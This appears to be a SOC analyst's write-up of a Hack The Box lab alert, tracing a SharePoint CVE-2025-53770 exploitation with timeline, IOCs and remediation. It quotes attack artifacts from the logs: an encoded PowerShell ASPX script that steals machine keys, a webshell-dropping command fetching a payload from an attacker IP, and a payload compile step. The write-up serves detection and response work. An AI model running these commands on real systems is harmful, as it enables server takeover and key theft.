---
tags:
  - htb
  - socrange
urls: https://enterprise.hackthebox.com/soc-range/alert/320
---
---

## Alert properties
Alert dispatched: Tue 22 Jul 25, 13:07

|Field|Value|
|---|---|
|**Referer**|/_layouts/SignOut.aspx|
|**Hostname**|SharePoint01|
|**User-Agent**|Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0|
|**Device Action**|Allowed|
|**Requested URL**|/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx|
|**Content-Length**|7699|
|**Source IP Address**|107.191.58.76|
|**HTTP Request Method**|POST|
|**Alert Trigger Reason**|Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation.|
|**Destination IP Address**|172.16.20.17|

## Investigation

The alerts points out to CVE-2025-53770, CVE that allows unauthenticated remote command execution thanks to deserialization in On-Premise SharePoint servers.

Looking at the headers of the malicious curl request in this [CVE-2025-53770 exploit](https://github.com/MuhammadWaseem29/CVE-2025-53770) GitHub repository, the Refereer, User-Agent and Requested URL match those observed in the alert, Content-Length is also similar.

At 2025-07-22 13:07:11, the IIS worker process w3wp.exe (legitimate Windows executable in charge of handling web requests) running under IIS APPPOOL\SharePoint - 80 spawned a  Base64 encoded PowerShell command, while w3wp.exe can execute commands is does not usually run PowerShell.

![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-3.png)

At 2025-07-22 13:07:24, PowerShell, running as a child of w3wp.exe under IIS APPPOOL\SharePoint - 80, spawned the aforementioned PowerShell Base64 encoded command:

```powershell
powershell.exe -EncodedCommand PCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+DQo8c2NyaXB0IHJ1bmF0PSJzZXJ2ZXIiIGxhbmd1YWdlPSJjIyIgQ09ERVBBR0U9IjY1MDAxIj4NCiAgICBwdWJsaWMgdm9pZCBQYWdlX2xvYWQoKQ0KICAgIHsNCgkJdmFyIHN5ID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZCgiU3lzdGVtLldlYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EiKTsNCiAgICAgICAgdmFyIG1rdCA9IHN5LkdldFR5cGUoIlN5c3RlbS5XZWIuQ29uZmlndXJhdGlvbi5NYWNoaW5lS2V5U2VjdGlvbiIpOw0KICAgICAgICB2YXIgZ2FjID0gbWt0LkdldE1ldGhvZCgiR2V0QXBwbGljYXRpb25Db25maWciLCBTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3MuU3RhdGljIHwgU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzLk5vblB1YmxpYyk7DQogICAgICAgIHZhciBjZyA9IChTeXN0ZW0uV2ViLkNvbmZpZ3VyYXRpb24uTWFjaGluZUtleVNlY3Rpb24pZ2FjLkludm9rZShudWxsLCBuZXcgb2JqZWN0WzBdKTsNCiAgICAgICAgUmVzcG9uc2UuV3JpdGUoY2cuVmFsaWRhdGlvbktleSsifCIrY2cuVmFsaWRhdGlvbisifCIrY2cuRGVjcnlwdGlvbktleSsifCIrY2cuRGVjcnlwdGlvbisifCIrY2cuQ29tcGF0aWJpbGl0eU1vZGUpOw0KICAgIH0NCjwvc2NyaXB0Pg==
```

![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-5.png)

Decoding it using Base64:
```powershell
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server" language="c#" CODEPAGE="65001">
    public void Page_load()
    {
		var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
        var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
        var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
        var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
        Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
    }
</script>
```

This script, as explained [here](https://isc.sans.edu/diary/32174#:~:text=Stealing%20a%20Machine%20Key), is used to steal the MachineKeys from the web.config file to achieve RCE on the server.


At 2025-07-22 13:07:27, a process running under IIS APPPOOL\SharePoint - 80 compiled a malicious C# file called payload.exe in the server using the native Windows tool csc.exe in PowerShell to the folder C:\Windows\Temp: 
```
csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
```
![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-2.png)

At 2025-07-22 13:07:29, a process running under IIS APPPOOL\SharePoint - 80 spawned the compiled payload.exe, spawning a CMD window in the server that left persistence as an .aspx file, possibly connecting to a C2 server to download a beacon:
```
"C:\Windows\System32\cmd.exe" /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
```
![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE.png)

The file hash `92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514` is reported as malicious and related to the ToolShell exploit by VirusTotal:
![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-4.png)

The IP 107.191.58.76 is reported as malicious and involved in the exploit of the CVE-2025-53770 by the [VirusTotal](https://www.virustotal.com/gui/ip-address/107.191.58.76/community) community:
![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-11.png)

At 2025-07-22 13:07:34, a process running under IIS APPPOOL\SharePoint - 80 executed the following command to steal the MachineKeys of the SharePoint server:
```
powershell.exe -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"
```
![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-12.png)

AT 2025-07-22 13:08:04, the server connected to the malicious IP 107.191.58.76,

![](images/SOC342%20-%20CVE‑2025‑53770%20SharePoint%20ToolShell%20Auth%20Bypass%20and%20RCE-13.png)

## IOCs

| Type | Value |
|------|-------|
| C2 IP | 107.191.58.76|
| spinstall0.aspx SHA256 Hash | 92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514 | 

## Remediation

1. Network isolate the server.
2. Regenerate the MachineKeys of the server.
3. Install the latest patch of On-Premise SharePoint.
4. Terminate the malicious connections.
5. Delete the malicious files.
6. Check if other instances of On-Premise SharePoint might be affected


## Conclusion

Based on the evidence the investigation supports a successfull CVE-2025-53770 exploitation.
Evidence includes obfuscated Base64 PowerShell command execution by the IIS worker w3wp.exe, the extraction of SharePoint Machines Keys, creation of an ASPX webshell, and outbound communication with a suspected C2. Further investigation must be performed by the SOC N2 team to determine the full scope of the compromise.

## Useful links
[Detecting SharePoint attacks via worker process activity](https://redcanary.com/blog/threat-detection/detecting-sharepoint-attacks-via-worker-process-activity/)
[MachineKeySection Class (System.Web.Configuration) \| Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection?view=netframework-4.8.1)
[wcf - What is w3wp.exe? - Stack Overflow](https://stackoverflow.com/questions/7822898/what-is-w3wp-exe)
[Stealing Machine Keys for fun and profit (or riding the SharePoint wave)](https://isc.sans.edu/diary/32174)
[VirusTotal - File - 92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514](https://www.virustotal.com/gui/file/92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514/community)